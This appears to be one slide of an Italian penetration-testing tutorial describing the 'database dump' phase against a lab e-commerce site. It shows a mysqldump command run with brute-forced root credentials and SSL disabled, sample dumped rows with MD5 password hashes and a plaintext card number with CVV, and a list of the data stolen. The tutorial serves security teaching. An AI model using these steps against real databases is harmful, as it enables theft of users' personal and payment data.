💾 Fase 3: Dump del Database

Estrarre il tesoro – Tutti i dati in un file
🧠 Il Ragionamento dell'Attaccante
"Ho le credenziali del database. Ora devo estrarre tutto: utenti, password hashate, numeri di carte di credito, ordini... Tutto quello che ha valore."

mysqldump è lo strumento ufficiale MySQL per creare backup completi. Ironia della sorte: lo stesso tool usato per i backup serve agli attaccanti per rubare dati.
⚡ Il Comando di Estrazione
mysqldump -h localhost -P 3302 \ -u root -prootpassword \ --ssl=0 \ --databases ecommerce_db > ecommerce_db_dump.sql
-h localhost -P 3302: Host e porta del target
-u root -p...: Credenziali ottenute con brute-force
--ssl=0: Disabilita SSL (⚠️ altra vulnerabilità!)
--databases: Esporta l'intero database
📄 Contenuto del Dump
-- Table: users INSERT INTO users VALUES (1, 'admin', '5f4dcc3b5aa765d61d8327deb882cf99', 'admin@shop.com'), (2, 'mario', '482c811da5d5b4bc6d497ffa98491e38', 'mario@email.it'); -- Table: credit_cards INSERT INTO credit_cards VALUES (1, 1, '4532015112830366', '12/25', '123');
💀 Cosa Abbiamo Ottenuto
✓ Tabella users:
Username, email e password hashate

✓ Tabella credit_cards:
Numeri di carta, scadenze e CVV in chiaro!

✓ Tabella orders:
Storico acquisti e indirizzi

⚠️ Dati sensibili NON cifrati = violazione GDPR!
